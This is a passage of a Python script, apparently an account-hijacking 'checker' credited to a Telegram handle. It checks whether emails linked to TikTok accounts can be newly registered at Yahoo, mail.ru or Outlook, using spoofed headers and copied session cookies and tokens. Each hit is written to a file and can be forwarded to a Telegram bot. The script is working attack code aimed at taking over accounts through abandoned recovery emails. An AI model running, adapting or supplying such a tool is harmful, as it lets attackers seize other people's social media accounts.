%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1657415199200%2C%22render%22%3A1657415200314%7D%7D&specId=yidregsimplified&cacheStored=&crumb=V0Pr4B6tQHi&acrumb=0sHA17fo&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&specData=3qiYX%2FHBcI%2F%2BhrvMxYBXgXQb1%2FYAeMSHZmV4MqgmhqN1URqj%2FsjgTGrzl4FYAaAL1UczLgsaT4rm7Cq3BXusOpCF83nfWay%2BC4rhWCth8rBob6OT8S9v0s7KQfuZoeXmPP0NCJxRHjiKlQBmUepkdKTRtym7LERXeBITKc8qTL15f6Vb9O1yc3ZBETBW%2FOpt6%2FNdXvTgPh8z9rX4CcDlWyjVuO2KusJUgIe2sQ%2BSs7EOIYSCVcNUAOqCtXAFkLyS%2FwtNW9ew2r%2BdkiOEmXXi2Akg3YFs3tNskYHR8cTvqHvpf9mEeGwYDCg0%2FGzQybLfG9um3opaS%2Bvnkz19nTE2jfxnlgudhbhKSkg5b4I3WA7tiQh%2BfdpkINdYrPRYXa%2FbQO47iWX9XnSJm536xRWWqrirGNYme3ZP%2FkbEHdsOCRN59fCXf9GEj0GSdIOYs2OI%2FgcOEl%2BQAV3uH0Dg8OZC0Cm9Nrk%2FYJTIntesxVHvpI5qGAYMr8sR47yrUHuZCahwj9T8tJob%2BJh7cKO1rw83V07K4zwiBSzeQyxbKKj%2BoaUK6tDYVCsS0nsPl9YYzNakW4V6hLVHiMlIwrqdSaaqyD%2FpkWwIZon33c6ulzzRogLES4lZi%2B6Y1I34QbnRs1M1%2Blag9xNYAhe2ysOQWsbec5F2vJaYY941UzlAEH5Z2aoCAgUchjmfRvAqwD3J%2FKlAmwATVMjlgwYwiGZb%2Bc6XIyzGV0P4iq%2F0h8mvJaBqloH%2Be8G%2BOApb2ybaGWor1R1RCt5oHPvbi5pcXhv895j3Pf8R%2BzuCxZu%2F2fLWCugzT4auXfUEvQoR9cBsQxKBe%2Fiw6eo78VzExH9qBh2kpEqtjy1LkHzoh24mn%2FTykqvPMu6cOtu0ZNv%2BCQVEXhER%2BLiZmHqtkvc75fUK1ELu4lKpMitRu4%2BnYTf7saiWOVdn2gQgI2p%2FXU7iPBSxwEzabRpoVwb5wUymGZFsloAcLmBz0FuWtkoqfHzmJdQSZY1y%2BJqMKP30vK8Zy9%2F8RVMpvb859VdesnhF%2B%2B1lFWkfCal3tQNR%2FnN%2BScD4A9rDs1alXxvEpGjnXSpCQ569imLxX11pbaozUXipv4%2BG2WrhGGuTulBoeucBhkiTNf3r73WJfwRCCJCEyztLcYbl3x9P6ahKOjGKEdVDnVi4vGIi47A56jVoQn3QoHmahw6PsqlV4dhtd0u%2BYQ0s09rmFGABQjPdQaSddrB0g32WVOBdruFLeevg9bKRkZYOcr1AfWsuIqi6HaDiKCgomeNN0xB77B0lrwLyS6bW5iGTPP6a%2BlokF6YJKoIlh%2B3xVDWZ4%2Bjj3iEViHGJJA4hsLGy%2FN88eRNZ2RVo957EK3%2FE6vu0L4phnMCwMRxx7PVY2d3oHdGfyMpYFnHK1HRhWspF6PbLoz1jewpUPtuUXmA8qtphATgd4GpwugPQJq6L6n1RFRnHd8WrazHf1HxSO1cZObRYDFPwwR1TK4RkS%2FCoHMePTwNFgy85Z%2FDZ3QYKGhQ8himvoLFH9yLpERLhvS7n%2BV%2BXBJhEOUEDqrTgzf87BX2qI5pKB8P1SZelaAgUU3cXMqxo3et1yxlXaeOptj3K6QrZHs%2BjfTWp5rSVCQ7lj%2BFVql1JChhIU7t0E6h0Y73%2Fy%2BSfnUUtLrjySQQD1vHE%2F6eZYQUHUnz7bYj88EVQZ4e8LAYJvh62gYgoHNIHnk%2Bsa18Q3OUVhcCRqaO4XIiUCWXWaMa8TC7OWOicicC7C73mfEapdQoRpacErL5cDj0lVU%2FkSO31BukbIJ3qXArWnB6xHoBG2L%2FJnwURub4U0e65qB3cAnFe1z%2Bu9SIYRQtmEX%2B%2Fb91mI%2F06XMQd3YrYv%2Bod2sTCVHbpiUXe6vR%2FG5edhHiGB53aMuHX1ljEB711okyoJOViTHu1Fuf4pLhvDSZyOeHBqqX5qj%2FsNjoyZGI1o04O%2F2u%2Bo%2BJMy5YvVVRd8ALRgcpOkqdG9KuT00t1b7R5J5TKKxwUbqMKnkUHGbHi3hA9rHD6Kqn7nfFNvzLmFvA7aN4mFbGy8SncJ9O6MBofHhFnPkhC%2FZdxkYtjDAtSRE9AVNvxEbbGHhqhKBJFaDn%2F2zbK1OqAyC1Wy7rjD7bzYZT3RFKprvz4Dp1SZO732C6%2BcEStFzKt1hK%2FzXDidbZz6bgRhasGBzT2m5ty1F8Y9VCUeIcDbhzkcsztEsqjTbgF1VHJvuxAPo14nDI%2FCHcGCOX7aHSXH4U7G0YFH7O09NruPxcR40KCfO%2FF8eQ%2Bd4ovBGb1SW%2F4wcJ9pWzPKS4XUQ5xSlitdekid5nyDTSEIODfW2vLufF9Da%2BFuj87kH0TtBcM0SR7d5XfYAMA1OOmzOt35LCJGFgF%2F3xyLZv1ghZT%2Bx28qC8fZ7V%2FVnH3uYrVM1S%2FIN71UZRS%2FUK6Cq9bVLrRfGSRqAYlpSalBB8squ%2BsGQ%2FrhLtu6J29Ttg0N1wHovjPX9kPgqsVCcYTIrUE0PcZDw%2BGd5EUiyBNF6HZ4oAMafvj5snS9gLIhIcG82aEhwIfiBR9Rwm%2F%2F7hGq5REIesblFcPIszNvXHr8Prb4xetLLmTYlLxHa9FhoiUG3HxbTJFxSPdc03x9h0665awOppQ4YxAQHjcxOrrzjxhrcZH2TL7DAJZS7F%2FpQae11m00SYVMbufIUT5rCqGf1Kc1zLEbVbEksEgsJ3I3xsjexEUPD9tuDOA5KzqfKBGG3jNbuSrfVcVgk6s9bsGRifmYPbk5ahcXu3c7ekuPG72VDVSaS9kpIFMyVDzQV%2F%2BFdK1vIC48pyZXyVNStS6KxQbKj8CkexdqxJwlV1JpRL8sFYb6o0L%2FMJNL%2B2GMVToSJXCqiM0BaBfvBIae2dIhs2tvZlui7IIUdUAQkwAMjjL9LN%2BvIgdoVtCupTMD3TUqTDfU1Cg0C3K98xi5mfeGP6JJwoSlztXIGDuM4EL%2FnSthWs9gniCkxA36e%2F6zW%2FioH0BKVMFanLjjBRUbaKSdVxtQiJYZ6wiYGJhm%2BTGCPMQG2JLlDj4bJeiNCe8wFzDEDUSL8Q65FLSCcZc9UQBxzSSpeIzCSFT4sY%2Fy61Nr%2BgPgBC36PGOx7M0rPPeeU1ePluevsUiXMhcAl7eayJnr5tG1iqRa%2FFSf5jhEaWM7eC10Ey7iAiNDvtxzoSFRqjnEAADD%2FPzhUmcBJdowhE4Y4YBRB81pIgWFgbuhD31Cnfl93n1UBSPEdvR%2B9acYSeFhLoJFkYIjDzwxi9sjp8ik9wUwk70ff9aJRrkfQRWDliWDaJA2um0X%2FYxazTvk6UYJ9du01kePKT%2BUs8fpulOJhEUi2U02ZyqVwpgeoQmdGrztvt9v7U5vICRNpXm3sdcx8bfkvFMRGsUoxPM%2Fxnla9yal2ZtkWPOltctM%2FmdkJtlBvHjffRBOV9CRHP0b7fIZAGFFh2qQbvkRrf53cQQG3OIM5d5AdtiC7769vQ1uKtciUcAmngVpQfMqXBdSgSA5xG1nKfxyZO9oTGIGlf5xJ9lCdoQdLuyJlR6ma5ro29HzqO%2FelrWrajXYFRMqb0jfbMTZiV0hyZpb8Whu6r5KEQ4i2iyZXrMu%2FKXN1LntbdD8%2BHRBQITCt3hvqkk0D%2BU8e1LGceaHsUyVOKx3KN%2FeH3iUAYX4LhP7QKylegSCMX8ujZMyQarDnJmUhdtdVTpqZuskfC3U%2BFuqcV1ueLwy7i7nwlnJR916wpBEKzJxuu5W4XY1xl295AAkrqQ1w3dQD3Y1RmzbHptQooybc87d4P%2BP48djTkXjk5%2BtzQza31zuVMYeXCEOveFDLjhCWJ%2FEfVo4om0PcaQMJ8rIJcwRPbBCHJHPny%2Bp5IjImeGDscr7NZfj6Rxs9a7BzbRv6sSZitlQrzasw8T5XHIglPVLX9qT1uvUhey%2FETHBTZS%2Fy4CyfIwCBgi7TV4L%2FY0D49DyWNvf9TUP4f%2FxP7fPw0MbUkf16e8fzUE2tkvkeeoYzyXkU5Oe9JSS6c2Jfwo%2FFRTB5K75JNwdog8sebO1NyXRVjJlaoS4SgnVJk5Aix2NUPMcIJU5MmYji0gKu1A6QSODbRtXhmvyd8b1FwRv1MWCSmUHfbkZYxLE6GDO24gaYyrwp0h7ahYC55bti4QrVpPDCcGEj7cUBtzUcLMT2MJOXsfjsAbRsRxBW%2BeMOpMhdnEDTFkNIbUPsmzzrMaUu7Y%2BUAfap639tZUe%2FbNqgibgye2KhlXPS%2FTGtxUGsDZqVBCW03N%2FWahUWhtLKp7KJnutk9otzkZ07VHReV1x3fblTYgS59RSPXwUGY97wQCpSbCFpL7xISbzM0SoAegHDQYy09MtD1vfhfDeEZHyR%2FFCt0YLWvIRVoA8A2K5xWUMmPrd657A2gGKeT0%2FthL%2FZpHTSOLLd5RA9VTKXNVu3xE%2FF0OKQ1HTp4p35M4FJV6eheJOiPgcU1BMuZKMXCXf7x0bpCevEXIeSYaD8pQJHLPXyCj%2BpWzjzNdBhOjbtSdloonEyHvrm19UB10QxDR%2B2fMLKJIDKQJtgYFjQhXGUxGpEmPTQ0uekJZ48ej2Gji1tqWlseMOMipg0S1Rgta7MWQQ3EL88J7u9PJf9soLTOaf7Pqqs%2BobulcEsjxv9aPwILr15ZMfdspWg%2Btx8%2BN5b%2B0uYMSwh%2FOdeMCHS8DONFUKN%2BI8ln3tV0kFaqPNNdHTbwJzbPv1a0Y7v%2FCaqPOoAqXPwpUxmI%2FzgQtCgJ91Raj%2F%2BPNzxDn6JxE7nUIo1X%2BjUwerAkQ2Dygy8Fho%2Bw1BYfihj03CZhjS1krj8Vd04aQabeKSZVzdjfCdpkfzwFHfi77iq6vKPHsQmsZadPFf6aXVazYE6SrXj4RRbaoBsW%2BtJ9PGpu3En9CgvKk9JrArFBq4qRM56H2C%2FwIoUQxYEFQgxiB9RYZMF1ZHmTluTqYOak6GO%2Fw7D%2FZjhBWtnBlpTbMafcrExzCy0YuUklTs5v3gQ6uMdvpWo60FlSd4TBhgRu%2BoyOMzxC2U7swA8JqWlfnvrlX0NmrSYKNHzloPAfpXINg7IR4%2BP2vdHHyEu%2FdymeKI4b3cS8fEDC%2BIr4D%2BfXa1edNyqPdFIFmvKGZeVRDuIXNXM%2BjZLLAD7R8Pw%2FRXC5X%2FgGXX01HU4Ma7vPcIcoUY0HpYRohxZHbuvlCxlbj6MMteOXJJPtgiN7z%2BjC6eyognmaE%2BWWeg4uemCw8mw0Ld2mKorywvWbu4DvOBaXuivqtDfkH5b%2BQstz493hTZ5ovVuAssLygF6US%2FFabYr3KxoyEjmhYpvsA45wctYfcjmFwdf1QT2wQz%2FOoskWn1fCsGKCU6OCb%2BHBCQa5KCSN5y%2FNpOWXUIyB3Z5jQXrs3%2F%2BcWGRkm6fDXJHiASkDuhaJuhg%2BHXaFPTGouoi%2BDpseLIE6QDjIhgVsm2WKIlTJfAekOEQMW8IPzFjABJrdWgZg08BqHIwFTSoMgz6DCT3xP%2BpCZE9xkzXCsPKgtvjqAyVrc8rQWvC2XznQYahjmw%2FTPz10lDVAlH41I8XP132BqPUv5jy3tmjQTFeIkbfH%2BQoe2HN4rHa07AwLHP6Y0gDQqIkbY4lPUoHNPeS6jVXnb6d%2FGFRl8tTKg4QCEaZX3lwzjjXXVAlmz%2BZ0wc1jGXRclTPTNnR%2BvklAjqPIypAz%2BR9tx4rLe5jHLXuCy0LHuIdb5OLrCF%2Fgr1MCywGJHpNao4oeukqk6OPPtFN8eYplJy8tnNwoJSsoNrXR1iNFIt%2F3VZRtgOQvrGQ7x0AXwvVqX6Vt%2BYzQ3WWQdu%2BBI9CsFPE7IX4Ek1ZJ97r1%2BREvommgXkRii4pYbZPEGbkgVMcI42x94LtVEM2ZXqsJyAaQY9rX7bsSAahgp3udxAGzoa%2FjTs6tW1oD6sBin1kcjElZbkBI80DCV2rka9LDImH9ZM7NDDU6leamdb2oJCAmB1YMXozgIV5kpMgbVr1%2BdAPuJX3lKyk9kWI9VrBCtmMo%3D%7CjUP9j77GikcMDQ84gY3nfg%3D%3D%7CIM7sEaFvNp%2BZ6Fsp6b915A%3D%3D&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=&lastName=&userid-domain=yahoo&userId={mail}&password=&birthYear=&signup='
							p = {'validateField': 'userId',}
							response = requests.post('https://login.yahoo.com/account/module/create', params=p,cookies=cook,headers=headers, data=data).text
							if 'userId' in response:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								print(' - '*9)
								print('\n')
							else:
								print(' - '*9)
								print(mail)
								
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								if SEND == True:
									
									requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {mail}\n - By @koleksibot')
								open('done.txt','a').write(mail+'\n')
								print(' - '*9)
								print('\n')
						
			
					
					
					
					
					
						if domen == '@mail.ru':
							headers_6 = {
								'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
							url = 'https://account.mail.ru/api/v1/user/exists'
							data_6 = {'email': mail}
							js = requests.post(url, data=data_6, headers=headers_6)
							if js.json()['body']['exists'] == False:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								print(' - '*9)
								print('\n')
								
								if SEND == True:
									
									requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {mail}\n - By @koleksibot')
								open('done.txt','a').write(mail+'\n')
							else:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								print(' - '*9)
								print('\n')
						if  domen =='@outlook.com':
							url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + mail + "&_=1604288577990"
							data = ''
							headers = {
			"Accept": "*/*",
			"Content-Type": "application/x-www-form-urlencoded",
		    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		    "Connection": "close",
		    "Host": "odc.officeapps.live.com",
		    "Accept-Encoding": "gzip, deflate",
		    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		    "uaid": "d06e1498e7ed4def9078bd46883f187b",
		    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
							html = requests.get(url, data=data, headers=headers).text
							if 'Neither' in html:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								
								if SEND == True:
									
									requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {mail}\n - By @koleksibot')
								open('done.txt','a').write(mail+'\n')
								print(' - '*9)
								print('\n')
							else:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								print(' - '*9)
								print('\n')
						
					elif '{"is_registered":0}' in r.text:
						print(' - '*9)
						print(mail)
						
						print(f'TIKTOK{White}  [{Red}x{White}] || Email {White}[{Red}x{White}]')
						
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						print(' - '*9)
						print('\n')
					elif 'Try again' in r.text:
						wait = True
					else:
						
						
						Block = True
